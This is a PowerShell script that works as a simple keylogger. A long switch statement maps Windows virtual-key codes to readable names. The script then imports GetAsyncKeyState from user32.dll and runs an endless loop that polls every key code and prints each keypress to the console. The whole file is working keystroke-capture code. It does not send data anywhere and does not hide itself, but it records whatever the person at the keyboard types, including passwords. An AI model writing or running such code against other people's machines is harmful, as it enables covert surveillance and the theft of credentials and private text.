function Get-KeyName {
    param ([int] $keyValue)

    switch ($keyValue) {
        0x01 { return "[LEFT_MOUSE_BUTTON]" }
        0x02 { return "[RIGHT_MOUSE_BUTTON]" }
        0x03 { return "[CANCEL]" }
        0x04 { return "[MIDDLE_MOUSE_BUTTON]" }
        0x05 { return "[XBUTTON1]" }
        0x06 { return "[XBUTTON2]" }
        0x08 { return "[BACKSPACE]" }
        0x09 { return "[TAB]" }
        0x0C { return "[CLEAR]" }
        0x0D { return "[RETURN]" }
        0x10 { return "[SHIFT]" }
        0x11 { return "[CONTROL]" }
        0x12 { return "[MENU]" }
        0x13 { return "[PAUSE]" }
        0x14 { return "[CAPS_LOCK]" }
        0x15 { return "[KANA]" }
        0x17 { return "[JUNJA]" }
        0x18 { return "[FINAL]" }
        0x19 { return "[KANJI]" }
        0x1B { return "[ESCAPE]" }
        0x1C { return "[CONVERT]" }
        0x1D { return "[NONCONVERT]" }
        0x1E { return "[ACCEPT]" }
        0x1F { return "[MODECHANGE]" }
        0x20 { return "[SPACE]" }
        0x21 { return "[PRIOR]" }
        0x22 { return "[NEXT]" }
        0x23 { return "[END]" }
        0x24 { return "[HOME]" }
        0x25 { return "[LEFT]" }
        0x26 { return "[UP]" }
        0x27 { return "[RIGHT]" }
        0x28 { return "[DOWN]" }
        0x29 { return "[SELECT]" }
        0x2A { return "[PRINT]" }
        0x2B { return "[EXECUTE]" }
        0x2C { return "[SNAPSHOT]" }
        0x2D { return "[INSERT]" }
        0x2E { return "[DELETE]" }
        0x5B { return "[LWIN]" }
        0x5D { return "[RWIN]" }
        0x5F { return "[SLEEP]" }
        0x60 { return "[NUMPAD0]" }
        0x61 { return "[NUMPAD1]" }
        0x62 { return "[NUMPAD2]" }
        0x63 { return "[NUMPAD3]" }
        0x64 { return "[NUMPAD4]" }
        0x65 { return "[NUMPAD5]" }
        0x66 { return "[NUMPAD6]" }
        0x67 { return "[NUMPAD7]" }
        0x68 { return "[NUMPAD8]" }
        0x69 { return "[NUMPAD9]" }
        0x6A { return "[MULTIPLY]" }
        0x6B { return "[ADD]" }
        0x6C { return "[SEPARATOR]" }
        0x6D { return "[SUBTRACT]" }
        0x6E { return "[DECIMAL]" }
        0x6F { return "[DIVIDE]" }
        0x70 { return "[F1]" }
        0x71 { return "[F2]" }
        0x72 { return "[F3]" }
        0x73 { return "[F4]" }
        0x74 { return "[F5]" }
        0x75 { return "[F6]" }
        0x76 { return "[F7]" }
        0x77 { return "[F8]" }
        0x78 { return "[F9]" }
        0x79 { return "[F10]" }
        0x7A { return "[F11]" }
        0x7B { return "[F12]" }
        0x7C { return "[F13]" }
        0x7D { return "[F14]" }
        0x7E { return "[F15]" }
        0x7F { return "[F16]" }
        0x80 { return "[F17]" }
        0x81 { return "[F18]" }
        0x82 { return "[F19]" }
        0x83 { return "[F20]" }
        0x84 { return "[F21]" }
        0x85 { return "[F22]" }
        0x86 { return "[F23]" }
        0x87 { return "[F24]" }
        0x90 { return "[NUMLOCK]" }
        0x91 { return "[SCROLL]" }
        0x92 { return "[OEM_NEC_EQUAL]" }
        0x93 { return "[OEM_FJ_JISHO]" }
        0x94 { return "[OEM_FJ_TOUROKU]" }
        0x95 { return "[OEM_FJ_LOYA]" }
        0x96 { return "[OEM_FJ_ROYA]" }
        0xA0 { return "[LSHIFT]" }
        0xA1 { return "[RSHIFT]" }
        0xA2 { return "[LCONTROL]" }
        0xA3 { return "[RCONTROL]" }
        0xA4 { return "[LMENU]" }
        0xA5 { return "[RMENU]" }
        0xA6 { return "[BROWSER_BACK]" }
        0xA7 { return "[BROWSER_FORWARD]" }
        0xA8 { return "[BROWSER_REFERSH]" }
        0xA9 { return "[BROWSER_STOP]" }
        0xAA { return "[BROWSER_SEARCH]" }
        0xAB { return "[BROWSER_FAVORITES]" }
        0xAC { return "[BROWSER_HOME]" }
        0xAD { return "[VOLUME_MUTE]" }
        0xAE { return "[VOLUME_DOWN]" }
        0xAF { return "[VOLUME_UP]" }
        0xB0 { return "[MEDIA_NEXT_TRACK]" }
        0xB1 { return "[MEDIA_PREVIOUS_TRACK]" }
        0xB2 { return "[MEDIA_STOP]" }
        0xB3 { return "[MEDIA_PLAY_PAUSE]" }
        0xB4 { return "[LAUNCH_MAIL]" }
        0xB5 { return "[LAUNCH_MEDIA_SELECT]" }
        0xB6 { return "[LAUNCH_APP1]" }
        0xB7 { return "[LAUNCH_APP2]" }
        0xBA { return "[OEM_1]" }
        0xBB { return "[OEM_PLUS]" }
        0xBC { return "[OEM_COMMA]" }
        0xBD { return "[OEM_MINUS]" }
        0xBE { return "[OEM_PERIOD]" }
        0xBF { return "[OEM_2]" }
        0xC0 { return "[OEM_3]" }
        0xDB { return "[OEM_4]" }
        0xDC { return "[OEM_5]" }
        0xDD { return "[OEM_6]" }
        0xDE { return "[OEM_7]" }
        0xDF { return "[OEM_8]" }
        0xE1 { return "[OEM_AX]" }
        0xE2 { return "[OEM_102]" }
        0xE3 { return "[ICO_HELP]" }
        0xE4 { return "[ICO_00]" }
        0xE5 { return "[PROCESSKEY]" }
        0xE6 { return "[ICO_CLEAR]" }
        0xE7 { return "[PACKET]" }
        0xE9 { return "[OEM_RESET]" }
        0xEA { return "[OEM_JUMP]" }
        0xEB { return "[OEM_PA1]" }
        0xEC { return "[OEM_PA2]" }
        0xED { return "[OEM_PA3]" }
        0xEE { return "[OEM_WSCTRL]" }
        0xEF { return "[OEM_CUSEL]" }
        0xF0 { return "[OEM_ATTN]" }
        0xF1 { return "[OEM_FINISH]" }
        0xF2 { return "[OEM_COPY]" }
        0xF3 { return "[OEM_AUTO]" }
        0xF4 { return "[OEM_ENLW]" }
        0xF5 { return "[OEM_BACKTAB]" }
        0xF6 { return "[ATTN]" }
        0xF7 { return "[CRSEL]" }
        0xF8 { return "[EXSEL]" }
        0xF9 { return "[EREOF]" }
        0xFA { return "[PLAY]" }
        0xFB { return "[ZOOM]" }
        0xFC { return "[NONAME]" }
        0xFD { return "[PA1]" }
        0xFE { return "[OEM_CLEAR]" }
        Default { return [char]$keyValue }
    }
}

$MemberDefinition = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

$user32 = Add-Type -MemberDefinition $MemberDefinition -Name "user32" -Namespace user32namespace -PassThru

while ($true) {
    for ($keyValue = 0; $keyValue -le 256; $keyValue++) {
        $ret = $user32::GetAsyncKeyState($keyValue)
        
        if ($ret -eq -32767) {
            Write-Host -NoNewLine "$(Get-KeyName($keyValue)) "
        }
    }
}
